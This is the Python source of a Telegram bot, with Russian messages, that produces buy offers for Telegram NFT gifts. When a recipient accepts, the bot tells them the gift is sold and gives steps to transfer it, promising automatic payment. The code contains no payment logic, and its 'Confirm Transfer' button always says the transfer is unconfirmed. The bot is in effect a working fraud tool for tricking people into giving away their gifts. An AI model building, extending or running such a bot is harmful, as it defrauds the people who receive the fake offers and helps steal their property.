import re
import os
import asyncio
from datetime import datetime, timedelta
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton, CallbackQuery
from aiogram.enums import ParseMode, ChatMemberStatus
from aiogram.client.default import DefaultBotProperties
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER_ID = 7856876217
CHANNEL = "@popapisa000"

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

# Временное хранилище данных офферов
temp_offers = {}
offers_time = {}

class OfferState(StatesGroup):
    waiting_for_price = State()

def main_kb():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="Создать оффер")],
            [KeyboardButton(text="Подписка"), KeyboardButton(text="Старт")]
        ],
        resize_keyboard=True
    )

async def is_subscribed(user_id: int) -> bool:
    if user_id == OWNER_ID:
        return True
    try:
        member = await bot.get_chat_member(CHANNEL, user_id)
        return member.status in [ChatMemberStatus.MEMBER, ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.CREATOR]
    except:
        return False

def get_remaining_time(created_at):
    end_time = created_at + timedelta(hours=24)
    remaining = end_time - datetime.now()
    if remaining.total_seconds() <= 0:
        return "истекло"
    hours = int(remaining.total_seconds() // 3600)
    minutes = int((remaining.total_seconds() % 3600) // 60)
    return f"{hours}ч {minutes:02d}м"

@dp.message(Command("start"))
@dp.message(F.text == "Старт")
async def start(message: types.Message):
    await message.answer("Бот для создания офферов на подарки.\n\nНажми «Создать оффер» или пришли ссылку.", reply_markup=main_kb())

@dp.message(F.text == "Подписка")
async def subscription_info(message: types.Message):
    if message.from_user.id == OWNER_ID:
        await message.answer("Ты владелец. Подписка не нужна.")
        return
    if await is_subscribed(message.from_user.id):
        await message.answer("Подписка активна.")
    else:
        kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Подписаться", url="https://t.me/popapisa000")]])
        await message.answer("Нужно подписаться на канал.", reply_markup=kb)

@dp.message(F.text == "Создать оффер")
async def create_offer_btn(message: types.Message):
    if not await is_subscribed(message.from_user.id):
        kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Подписаться", url="https://t.me/popapisa000")]])
        await message.answer("Сначала подпишись на канал.", reply_markup=kb)
        return
    await message.answer("Пришли ссылку на подарок:\n<code>https://t.me/nft/Название-123</code>")

@dp.message(Command("offer"))
async def offer_command(message: types.Message):
    if not await is_subscribed(message.from_user.id):
        kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Подписаться", url="https://t.me/popapisa000")]])
        await message.answer("Сначала подпишись.", reply_markup=kb)
        return
    try:
        parts = message.text.split()
        if len(parts) < 4:
            await message.answer("Формат: /offer ссылка цена валюта")
            return
        link = parts[1]
        price = parts[2]
        currency = parts[3].lower()
        if not re.match(r"https?://t\.me/nft/\S+", link):
            await message.answer("Неверная ссылка")
            return
        if not price.isdigit():
            await message.answer("Цена должна быть числом")
            return
        if currency not in ["stars", "gram", "ton"]:
            await message.answer("Валюта: stars, gram или ton")
            return
        await send_offer(message, link, price, currency, message.from_user)
    except Exception as e:
        await message.answer(f"Ошибка: {e}")

async def send_offer(target, link, price, currency, user):
    currency_text = {"stars": "⭐", "gram": "Gram", "ton": "TON"}[currency]
    gift_name = link.split("/")[-1].replace("-", " #")
    created_at = datetime.now()
    offer_id = f"{user.id}_{int(created_at.timestamp())}"
    offers_time[offer_id] = created_at
    remaining = get_remaining_time(created_at)

    text = f"<a href='{link}'>ПОКАЗАТЬ ПОДАРОК</a>\n\n<b>{user.full_name}</b> предлагает Вам\n<b>{price} {currency_text}</b> за подарок <b>{gift_name}</b>.\n\nПредложение действует ещё {remaining}."

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="ПОКАЗАТЬ ПОДАРОК", url=link)],
        [
            InlineKeyboardButton(text="Отклонить", callback_data=f"d:{user.id}"),
            InlineKeyboardButton(text="Принять", callback_data=f"a:{user.id}:{price}:{currency}:{offer_id}")
        ]
    ])

    # Сохраняем ссылку отдельно (чтобы не превышать лимит 64 символа)
    temp_offers[offer_id] = link

    if isinstance(target, types.Message):
        try:
            await target.delete()
        except:
            pass
        await target.answer(text, reply_markup=keyboard, disable_web_page_preview=False)
    else:
        await target.message.answer(text, reply_markup=keyboard, disable_web_page_preview=False)

@dp.message(F.text.regexp(r"https?://t\.me/nft/\S+"))
async def got_link(message: types.Message, state: FSMContext):
    if not await is_subscribed(message.from_user.id):
        kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Подписаться", url="https://t.me/popapisa000")]])
        await message.answer("Сначала подпишись на канал.", reply_markup=kb)
        return
    await state.update_data(link=message.text.strip())
    await state.set_state(OfferState.waiting_for_price)
    await message.answer("Введи цену (только число):")

@dp.message(OfferState.waiting_for_price)
async def got_price(message: types.Message, state: FSMContext):
    if not message.text.isdigit():
        await message.answer("Нужно только число:")
        return

    data = await state.get_data()
    link = data.get("link")
    price = message.text
    await state.clear()

    # Короткий ID вместо длинной ссылки
    short_id = f"{message.from_user.id}_{int(datetime.now().timestamp())}"
    temp_offers[short_id] = link

    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="Stars", callback_data=f"c:stars:{price}:{short_id}"),
        InlineKeyboardButton(text="Gram", callback_data=f"c:gram:{price}:{short_id}"),
        InlineKeyboardButton(text="TON", callback_data=f"c:ton:{price}:{short_id}")
    ]])
    await message.answer("Выбери валюту:", reply_markup=kb)

@dp.callback_query(F.data.startswith("c:"))
async def got_currency(callback: CallbackQuery):
    try:
        # c:currency:price:short_id
        parts = callback.data.split(":")
        currency = parts[1]
        price = parts[2]
        short_id = parts[3]

        link = temp_offers.get(short_id)
        if not link:
            await callback.answer("Данные устарели. Создай оффер заново.", show_alert=True)
            return

        await callback.answer()
        await send_offer(callback, link, price, currency, callback.from_user)
    except Exception as e:
        await callback.answer(f"Ошибка: {e}", show_alert=True)

@dp.callback_query(F.data.startswith("a:"))
async def accept_offer(callback: CallbackQuery):
    try:
        # a:seller_id:price:currency:offer_id
        parts = callback.data.split(":")
        seller_id = int(parts[1])
        price = parts[2]
        currency = parts[3]
        offer_id = parts[4]

        link = temp_offers.get(offer_id, "")
        currency_text = {"stars": "⭐", "gram": "Gram", "ton": "TON"}.get(currency, currency)
        gift_name = link.split("/")[-1].replace("-", " #") if link else "подарок"

        if offer_id in offers_time and get_remaining_time(offers_time[offer_id]) == "истекло":
            await callback.answer("Срок действия истёк.", show_alert=True)
            return

        await callback.answer(
            "Предложение о продаже принято.\n\nСледующий этап — передача подарка покупателю. Оплата станет доступна после подтверждения получения.",
            show_alert=True
        )

        new_text = f"<b>Подарок: {gift_name}</b>\nуспешно продан!\n\n• Передайте подарок покупателю, чтобы получить <b>{price} {currency_text}</b>."
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Как передать", callback_data=f"h:{price}:{currency_text}:{gift_name}")],
            [InlineKeyboardButton(text="Confirm Transfer", callback_data=f"cf:{seller_id}:{price}:{currency_text}")]
        ])
        await callback.message.edit_text(new_text, reply_markup=keyboard)

        try:
            await bot.send_message(seller_id, f"<b>Подарок продан!</b>\n\nПокупатель: @{callback.from_user.username or callback.from_user.full_name}\nЦена: <b>{price} {currency_text}</b>\nПодарок: {gift_name}")
        except:
            pass
    except Exception as e:
        await callback.answer(f"Ошибка: {e}", show_alert=True)

@dp.callback_query(F.data.startswith("h:"))
async def how_to_transfer(callback: CallbackQuery):
    try:
        parts = callback.data.split(":")
        price = parts[1]
        currency_text = parts[2]
        gift_name = parts[3] if len(parts) > 3 else "подарок"

        text = f"<b>Сделка подтверждена.</b>\n\nПодарок <b>{gift_name}</b> зарезервирован. Чтобы получить <b>{price} {currency_text}</b>, передайте его покупателю.\n\n<b>Как передать подарок:</b>\n1. Откройте Профиль → Подарки в Telegram.\n2. Выберите <b>{gift_name}</b> в своём списке.\n3. Нажмите «Передать», затем укажите покупателя.\n4. Проверьте данные и подтвердите отправку.\n\n<b>Автоматическое завершение сделки</b>\nПосле подтверждения передачи сумма <b>{price} {currency_text}</b> автоматически станет доступна на балансе продавца."
        kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Назад", callback_data="back")]])
        await callback.message.edit_text(text, reply_markup=kb)
        await callback.answer()
    except Exception as e:
        await callback.answer(f"Ошибка: {e}", show_alert=True)

@dp.callback_query(F.data == "back")
async def back_to_sold(callback: CallbackQuery):
    await callback.answer()

@dp.callback_query(F.data.startswith("cf:"))
async def confirm_transfer(callback: CallbackQuery):
    parts = callback.data.split(":")
    price = parts[2]
    currency_text = parts[3]
    await callback.answer(f"Передача подарка пока не подтверждена.\n\nЗавершите передачу покупателю — после подтверждения станет доступна оплата {price} {currency_text}.", show_alert=True)

@dp.callback_query(F.data.startswith("d:"))
async def decline_offer(callback: CallbackQuery):
    seller_id = int(callback.data.split(":")[1])
    await callback.answer("Вы отклонили предложение", show_alert=True)
    try:
        await callback.message.edit_reply_markup(reply_markup=None)
    except:
        pass
    try:
        await bot.send_message(seller_id, f"Кто-то отклонил твоё предложение.\nПользователь: @{callback.from_user.username or callback.from_user.full_name}")
    except:
        pass

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
